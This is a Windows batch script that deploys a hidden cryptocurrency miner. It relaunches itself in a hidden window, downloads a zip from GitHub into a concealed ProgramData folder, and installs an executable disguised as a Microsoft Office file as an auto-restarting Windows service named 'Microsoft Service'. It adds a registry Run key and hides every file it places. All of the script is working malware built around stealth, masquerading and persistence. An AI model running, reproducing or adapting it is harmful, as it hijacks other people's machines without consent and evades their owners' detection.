@echo off
setlocal enabledelayedexpansion

:: Hidden Window Execution
if "%~1"=="hidden" goto :main
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c """"%~f0"" hidden"", 0, false"^)
exit /b

:main
:: Single Instance Check
tasklist /FI "IMAGENAME eq Microsoft@OfficeTempletes.exe" 2>NUL | find /I "Microsoft@OfficeTempletes.exe" >NUL
if %ERRORLEVEL% equ 0 exit /b

:: Configuration
set "MINER_DIR=%ProgramData%\Microsoft\Windows\Templates\mall"
set "MINER_EXE=Microsoft@OfficeTempletes.exe"
set "MALL_ZIP_URL=https://github.com/Drakovthe6th/TBuG/raw/master/mall.zip"
set "NSSM_URL=https://nssm.cc/ci/nssm-2.24-103-gdee49fc.zip"
set "SERVICE_NAME=Microsoft Service"
set "PRIORITY=Normal"

:: Create Hidden Directory
if not exist "%MINER_DIR%" (
    mkdir "%MINER_DIR%" >nul 2>&1
    attrib +s +h "%MINER_DIR%" >nul 2>&1
)

:: Download and Extract mall.zip
if not exist "%MINER_DIR%\%MINER_EXE%" (
    echo [*] Downloading package...
    set "ZIP_PATH=%MINER_DIR%\mall.zip"
    
    :: Download with PowerShell
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'Tls12'; (New-Object Net.WebClient).DownloadFile('%MALL_ZIP_URL%', '%ZIP_PATH%')"
    
    if not exist "%ZIP_PATH%" (
        echo [!] Download failed
        timeout /t 3 >nul
        exit /b
    )
    
    echo [*] Extracting package...
    powershell -Command "Add-Type -Assembly System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory('%ZIP_PATH%', '%MINER_DIR%'); Remove-Item '%ZIP_PATH%' -Force"
    
    :: Hide all extracted files
    attrib +s +h "%MINER_DIR%\*" /s /d >nul 2>&1
)

:: Verify miner exists
if not exist "%MINER_DIR%\%MINER_EXE%" (
    echo [!] Miner executable missing
    timeout /t 3 >nul
    exit /b
)

:: Download and Install NSSM
echo [*] Installing service manager...
set "NSSM_ZIP=%MINER_DIR%\nssm.zip"

powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'Tls12'; (New-Object Net.WebClient).DownloadFile('%NSSM_URL%', '%NSSM_ZIP%')"

if exist "%NSSM_ZIP%" (
    powershell -Command "Add-Type -Assembly System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory('%NSSM_ZIP%', '%MINER_DIR%\nssm'); Remove-Item '%NSSM_ZIP%' -Force"
)

:: Find nssm.exe
set "NSSM_EXE="
for /f "delims=" %%i in ('dir /b /s "%MINER_DIR%\nssm\nssm.exe" 2^>nul') do set "NSSM_EXE=%%i"

if not defined NSSM_EXE (
    echo [!] NSSM not found. Using system PATH.
    set "NSSM_EXE=nssm"
)

:: Install Service
echo [*] Creating %SERVICE_NAME% service...
"%NSSM_EXE%" install "%SERVICE_NAME%" "%MINER_DIR%\%MINER_EXE%"
"%NSSM_EXE%" set "%SERVICE_NAME%" AppDirectory "%MINER_DIR%"
"%NSSM_EXE%" set "%SERVICE_NAME%" AppParameters "--config=config.json"
"%NSSM_EXE%" set "%SERVICE_NAME%" AppPriority %PRIORITY%
"%NSSM_EXE%" set "%SERVICE_NAME%" Start SERVICE_AUTO_START
"%NSSM_EXE%" set "%SERVICE_NAME%" DependOnService "winmgmt"
"%NSSM_EXE%" set "%SERVICE_NAME%" AppStopMethodSkip 6
"%NSSM_EXE%" set "%SERVICE_NAME%" AppStopMethodConsole 1500
"%NSSM_EXE%" set "%SERVICE_NAME%" AppNoConsole 1

:: Configure Service Recovery
sc failure "%SERVICE_NAME%" reset= 86400 actions= restart/60000/restart/60000 >nul

:: Start Service
echo [*] Starting service...
net start "%SERVICE_NAME%" >nul 2>&1 || echo [!] Service start failed - will start on boot

:: Create Registry Persistence
echo [*] Setting up persistence...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OfficeTemplates" /t REG_SZ /d "\"%MINER_DIR%\%MINER_EXE%\" --background" /f >nul

:: Cleanup
echo [*] Performing cleanup...
if exist "%MINER_DIR%\nssm" rmdir /s /q "%MINER_DIR%\nssm" >nul 2>&1
attrib +s +h "%MINER_DIR%\*" /s /d >nul 2>&1

echo [+] Deployment completed successfully
timeout /t 2 >nul
exit